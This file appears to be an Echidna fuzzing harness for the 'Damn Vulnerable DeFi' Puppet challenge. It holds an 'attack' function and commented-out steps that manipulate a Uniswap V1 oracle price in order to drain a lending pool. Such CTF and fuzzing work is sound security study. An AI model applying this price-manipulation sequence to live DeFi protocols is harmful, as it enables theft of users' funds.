pragma solidity ^0.8.0;

import "@common/uniswap/UniswapV1Exchange.sol";
import "@common/DamnValuableToken.sol";

import "../src/PuppetPool.sol";
import "./Deployer.sol";

/// @dev Run the template with
///      ```
///      cd repo
///      solc-select use 0.8.0
///      echidna test/Invariants.sol --contract Echidna --config test/echidna.config.yaml
///      ```
contract Echidna {
    using Address for address payable;

    Deployer _deployer;

    DamnValuableToken _token;
    PuppetPool _pool;
    UniswapV1Exchange _exchange;

    uint256 public constant ATTACKER_TOKENS = 1000 ether;
    uint256 public constant ATTACKER_ETH = 25 ether;

    uint256 _initialPoolTokenBalance;

    constructor() payable {
        _deployer = new Deployer();
        (_token, _pool, _exchange) = _deployer.deploy{value: msg.value}();

        _initialPoolTokenBalance = _deployer.POOL_INITIAL_TOKEN_BALANCE();

        _deployer.transfer(address(this), ATTACKER_TOKENS);
    }

    // //////////////
    // EDUCATED GUESS
    // //////////////

    function attack() external {
        uint256 tokensToBorrow = 90_000;
        _pool.borrow{value: tokensToBorrow * 2}(tokensToBorrow, address(this));

        _exchange.ethToTokenSwapInput{value: 1 ether}(
            1,
            block.timestamp + 1 hours
        );

        _token.approve(address(_exchange), 1 ether);
        _exchange.tokenToEthSwapInput(0.01 ether, 1, block.timestamp + 1 hours);

        // _token.approve(address(_exchange), ATTACKER_TOKENS);
        // _exchange.tokenToEthSwapInput(
        //     ATTACKER_TOKENS,
        //     // @audit-info min-eth needs to be > 0
        //     1, // min eth
        //     block.timestamp + 1 hours
        // );
        // _pool.borrow{value: address(this).balance}(
        //     _initialPoolTokenBalance,
        //     address(this)
        // );
        // _exchange.ethToTokenSwapInput{value: address(this).balance}(
        //     1, // min token
        //     block.timestamp + 1 hours
        // );
    }

    // /////////////////
    // SUSPECT FUNCTIONS
    // /////////////////

    // function flashLoan(uint256 amount) external {
    //     _pool.flashLoan(amount);
    // }

    // function executeAction(uint256 actionId) external {
    //     _gov.executeAction(actionId);
    // }

    // ////////////////////
    // INVARIANT PROPERTIES
    // ////////////////////

    function echidna_cannot_empty_tokens_from_pool()
        public
        view
        returns (bool)
    {
        return _token.balanceOf(address(_pool)) > 0;
    }
}
